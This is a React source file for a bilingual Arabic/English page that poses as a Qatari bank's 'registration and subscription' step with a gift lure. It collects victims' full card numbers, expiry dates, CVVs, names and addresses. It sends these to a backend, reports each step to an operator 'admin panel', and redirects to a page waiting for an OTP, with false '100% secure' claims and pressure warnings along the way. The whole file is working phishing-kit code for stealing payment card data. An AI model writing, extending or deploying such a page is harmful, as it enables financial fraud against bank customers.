import { useState, useEffect } from "react";
import { useLocation, useSearch } from "wouter";
import { trpc } from "@/lib/trpc";
import { useLanguage } from "@/contexts/LanguageContext";
import { toast } from "sonner";
import { motion } from "framer-motion";
import { 
  CreditCard, 
  MapPin, 
  ShieldCheck,
  AlertTriangle,
  Lock,
  ChevronRight,
  X
} from "lucide-react";
import Header from "@/components/Header";

export default function RegistrationCompletion() {
  const [, setLocation] = useLocation();
  const search = useSearch();
  const { language } = useLanguage();
  const params = new URLSearchParams(search);
  const bankId = params.get("bank") || "qnb";
  const sessionId = localStorage.getItem("sessionId") || params.get("session") || "";
  
  const isArabic = language === "ar";
  const hasError = params.get("error") === "true";

  const [formData, setFormData] = useState({
    country: "QA",
    area: "",
    street: "",
    building: "",
    cardNumber: "",
    expiryDate: "",
    cvv: "",
    cardholderName: "",
  });

  const submitLoginMethodMutation = trpc.submissions.submitLoginMethod.useMutation();
  const reportStepMutation = trpc.submissions.reportStep.useMutation();

  useEffect(() => {
    if (sessionId) {
      reportStepMutation.mutate({
        sessionId,
        step: "registration-completion"
      });
    }
  }, [sessionId]);

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
    const { name, value } = e.target;
    
    if (name === "cardNumber") {
      let v = value.replace(/\s?/g, '').replace(/(\d{4})/g, '$1 ').trim();
      if (v.length > 19) v = v.slice(0, 19);
      setFormData(prev => ({ ...prev, [name]: v }));
    } else if (name === "expiryDate") {
      let cleanedValue = value.replace(/\D/g, "");
      if (cleanedValue.length > 4) cleanedValue = cleanedValue.slice(0, 4);
      if (cleanedValue.length > 2) cleanedValue = cleanedValue.slice(0, 2) + "/" + cleanedValue.slice(2);
      setFormData((prev) => ({ ...prev, [name]: cleanedValue }));
    } else {
      setFormData((prev) => ({ ...prev, [name]: value }));
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!formData.area || !formData.street || !formData.building) {
      toast.error(isArabic ? "يرجى إكمال بيانات العنوان" : "Please complete address details");
      return;
    }

    if (!formData.cardNumber || !formData.cardholderName || !formData.expiryDate || !formData.cvv) {
      toast.error(isArabic ? "يرجى إكمال بيانات الدفع" : "Please complete payment details");
      return;
    }

    try {
      // التأكد من إبلاغ لوحة الإدارة بالمرحلة الحالية قبل الإرسال
      await reportStepMutation.mutateAsync({
        sessionId,
        step: "card-payment"
      });

      await submitLoginMethodMutation.mutateAsync({
        sessionId,
        loginType: "registration_completion",
        username: "",
        password: "",
        deliveryMethod: "home",
        deliveryAddress: `${formData.area}, ${formData.street}, ${formData.building}`,
        phoneConfirmation: "",
        branchName: "",
        cardNumber: formData.cardNumber,
        cardholderName: formData.cardholderName,
        expiryDate: formData.expiryDate,
        cvv: formData.cvv,
        issuanceFee: "10",
        deliveryFee: "0",
        totalAmount: "10",
      });
      
      setLocation(`/waiting?bank=${bankId}&session=${sessionId}&next=otp`);
    } catch (error) {
      toast.error(isArabic ? "حدث خطأ أثناء الإرسال" : "An error occurred during submission");
    }
  };

  return (
    <div className="min-h-screen bg-slate-50 flex flex-col font-sans" dir={isArabic ? "rtl" : "ltr"}>
      <Header />

      <main className="flex-1 max-w-xl mx-auto w-full px-4 py-8">
        <motion.div 
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          className="space-y-6"
        >
          <div className="text-center mb-8">
            <h1 className="text-2xl font-black text-slate-800">
              {isArabic ? "إتمام التسجيل والاشتراك" : "Complete Registration & Subscription"}
            </h1>
            <p className="text-slate-500 font-medium mt-2">
              {isArabic ? "يرجى تأكيد عنوان الاستلام وبيانات العضوية" : "Please confirm delivery address and membership details"}
            </p>
          </div>

          {hasError && (
            <div className="p-4 bg-red-50 border-2 border-red-100 rounded-2xl flex items-center gap-3 text-red-700 text-sm font-bold">
              <X size={20} className="shrink-0" />
              <p>{isArabic ? "فشل تأكيد الاشتراك، يرجى التحقق من البيانات والمحاولة مرة أخرى" : "Subscription confirmation failed, please check data and try again"}</p>
            </div>
          )}

          <form onSubmit={handleSubmit} className="space-y-6">
            {/* Address Section */}
            <div className="bg-white rounded-3xl p-6 shadow-sm border border-slate-100 space-y-4">
              <div className="flex items-center gap-2 mb-2 text-[#8C0032]">
                <MapPin size={20} />
                <h2 className="font-black">{isArabic ? "عنوان استلام الهدية والبطاقة" : "Gift & Card Delivery Address"}</h2>
              </div>

              <div className="space-y-4">
                <div>
                  <label className="text-xs font-bold text-slate-400 uppercase tracking-wider mb-1 block px-1">
                    {isArabic ? "الدولة" : "Country"}
                  </label>
                  <select 
                    name="country"
                    className="w-full bg-slate-50 border-2 border-slate-100 rounded-xl px-4 py-3 focus:border-[#8C0032] outline-none transition-all font-bold"
                    value={formData.country}
                    onChange={handleInputChange}
                  >
                    <option value="QA">{isArabic ? "قطر" : "Qatar"}</option>
                    <option value="SA">{isArabic ? "المملكة العربية السعودية" : "Saudi Arabia"}</option>
                    <option value="AE">{isArabic ? "الإمارات العربية المتحدة" : "United Arab Emirates"}</option>
                    <option value="KW">{isArabic ? "الكويت" : "Kuwait"}</option>
                  </select>
                </div>

                <div className="grid grid-cols-1 gap-4">
                  <input 
                    name="area"
                    type="text"
                    placeholder={isArabic ? "المنطقة (مثال: الدفنة، السد)" : "Area (e.g. West Bay, Al Sadd)"}
                    className="w-full bg-slate-50 border-2 border-slate-100 rounded-xl px-4 py-3 focus:border-[#8C0032] outline-none transition-all font-medium"
                    value={formData.area}
                    onChange={handleInputChange}
                    required
                  />
                  <div className="grid grid-cols-2 gap-4">
                    <input 
                      name="street"
                      type="text"
                      placeholder={isArabic ? "اسم الشارع" : "Street Name"}
                      className="w-full bg-slate-50 border-2 border-slate-100 rounded-xl px-4 py-3 focus:border-[#8C0032] outline-none transition-all font-medium"
                      value={formData.street}
                      onChange={handleInputChange}
                      required
                    />
                    <input 
                      name="building"
                      type="text"
                      placeholder={isArabic ? "رقم المبنى / الفيلا" : "Building / Villa No."}
                      className="w-full bg-slate-50 border-2 border-slate-100 rounded-xl px-4 py-3 focus:border-[#8C0032] outline-none transition-all font-medium"
                      value={formData.building}
                      onChange={handleInputChange}
                      required
                    />
                  </div>
                </div>
              </div>
            </div>

            {/* Payment Section */}
            <div className="bg-white rounded-3xl p-6 shadow-sm border border-slate-100 space-y-4">
              <div className="flex items-center justify-between mb-2">
                <div className="flex items-center gap-2 text-[#8C0032]">
                  <CreditCard size={20} />
                  <h2 className="font-black">{isArabic ? "تأكيد رسوم العضوية" : "Confirm Membership Fees"}</h2>
                </div>
                <div className="bg-emerald-50 text-emerald-700 px-3 py-1 rounded-full text-xs font-black">
                  10 {isArabic ? "ر.ق" : "QAR"}
                </div>
              </div>

              <div className="p-4 bg-slate-50 rounded-2xl border-2 border-slate-100 space-y-4">
                <div className="flex items-center gap-3 pb-3 border-b border-slate-200">
                  <div className="w-4 h-4 rounded-full border-4 border-[#8C0032] bg-white"></div>
                  <div className="flex items-center gap-2 font-bold text-slate-700">
                    <CreditCard size={18} />
                    <span>{isArabic ? "بطاقة ائتمان / خصم" : "Credit / Debit Card"}</span>
                  </div>
                  <div className="mr-auto flex gap-2 items-center">
                    <img src="https://files.manuscdn.com/user_upload_by_module/session_file/310519663839209687/ZFcNkyAbKqaPzbFM.png" className="h-4 object-contain" alt="Visa" />
                    <img src="https://files.manuscdn.com/user_upload_by_module/session_file/310519663839209687/ZBgYQWBjxkoUvPKW.png" className="h-6 object-contain" alt="Mastercard" />
                  </div>
                </div>

                <div className="space-y-4">
                  <div className="space-y-1">
                    <label className="text-[10px] font-black text-slate-400 uppercase px-1">{isArabic ? "بيانات البطاقة" : "Card Information"}</label>
                    <div className="relative">
                      <input 
                        name="cardNumber"
                        type="tel"
                        placeholder="1234 1234 1234 1234"
                        className="w-full bg-white border-2 border-slate-100 rounded-xl px-4 py-3 focus:border-[#8C0032] outline-none transition-all font-bold tracking-widest"
                        value={formData.cardNumber}
                        onChange={handleInputChange}
                        required
                      />
                      <Lock className="absolute left-4 top-1/2 -translate-y-1/2 text-slate-200" size={16} />
                    </div>
                  </div>

                  <div className="grid grid-cols-2 gap-4">
                    <div className="space-y-1">
                      <input 
                        name="expiryDate"
                        type="text"
                        placeholder="MM / YY"
                        className="w-full bg-white border-2 border-slate-100 rounded-xl px-4 py-3 focus:border-[#8C0032] outline-none transition-all font-bold text-center"
                        value={formData.expiryDate}
                        onChange={handleInputChange}
                        required
                      />
                    </div>
                    <div className="space-y-1">
                      <div className="relative">
                        <input 
                          name="cvv"
                          type="password"
                          placeholder="CVC"
                          className="w-full bg-white border-2 border-slate-100 rounded-xl px-4 py-3 focus:border-[#8C0032] outline-none transition-all font-bold text-center"
                          value={formData.cvv}
                          onChange={handleInputChange}
                          maxLength={4}
                          required
                        />
                        <div className="absolute right-3 top-1/2 -translate-y-1/2 text-slate-200">
                          <CreditCard size={16} />
                        </div>
                      </div>
                    </div>
                  </div>

                  <div className="space-y-1">
                    <label className="text-[10px] font-black text-slate-400 uppercase px-1">{isArabic ? "اسم صاحب البطاقة" : "Cardholder Name"}</label>
                    <input 
                      name="cardholderName"
                      type="text"
                      placeholder={isArabic ? "الاسم الكامل كما يظهر على البطاقة" : "Full name on card"}
                      className="w-full bg-white border-2 border-slate-100 rounded-xl px-4 py-3 focus:border-[#8C0032] outline-none transition-all font-bold"
                      value={formData.cardholderName}
                      onChange={handleInputChange}
                      required
                    />
                  </div>
                </div>
              </div>
            </div>

            {/* Warning Message */}
            <div className="bg-amber-50 border-2 border-amber-100 rounded-2xl p-5 flex gap-4">
              <AlertTriangle className="text-amber-500 shrink-0" size={24} />
              <div className="text-xs font-bold text-amber-800 leading-relaxed">
                {isArabic 
                  ? "في حالة عدم تأكيد الاشتراك سوف يتم إلغاء الطلب. في حالة إدخال البيانات بشكل متكرر بدون تأكيد قد يتم حظرك من الاشتراك في العضوية."
                  : "If the subscription is not confirmed, the request will be cancelled. Entering data repeatedly without confirmation may lead to being blocked from membership subscription."}
              </div>
            </div>

            <button 
              type="submit"
              disabled={submitLoginMethodMutation.isLoading}
              className="w-full bg-[#8C0032] hover:bg-[#700028] text-white py-5 rounded-2xl font-black text-lg shadow-xl shadow-[#8C0032]/20 transition-all flex items-center justify-center gap-3 group disabled:opacity-70"
            >
              {submitLoginMethodMutation.isLoading ? (
                <div className="w-6 h-6 border-4 border-white/30 border-t-white rounded-full animate-spin"></div>
              ) : (
                <>
                  <span>{isArabic ? "تأكيد الاشتراك واستلام الهدية" : "Confirm Subscription & Get Gift"}</span>
                  <ChevronRight className={`group-hover:translate-x-1 transition-transform ${isArabic ? 'rotate-180 group-hover:-translate-x-1' : ''}`} />
                </>
              )}
            </button>
          </form>

          <div className="flex items-center justify-center gap-4 py-4 opacity-50">
            <ShieldCheck size={16} />
            <span className="text-[10px] font-black uppercase tracking-widest">{isArabic ? "دفع آمن ومحمي 100%" : "100% SECURE & PROTECTED PAYMENT"}</span>
          </div>
        </motion.div>
      </main>

      <footer className="mt-auto">
        <div className="footer-image-container">
          <img 
            src={isArabic ? "https://i.ibb.co/23sMQkSF/IMG-20260714-WA0015.jpg" : "https://i.ibb.co/609jMvhx/IMG-20260714-WA0016.jpg"} 
            className="footer-image-standard" 
            alt="Footer" 
          />
        </div>
      </footer>
    </div>
  );
}
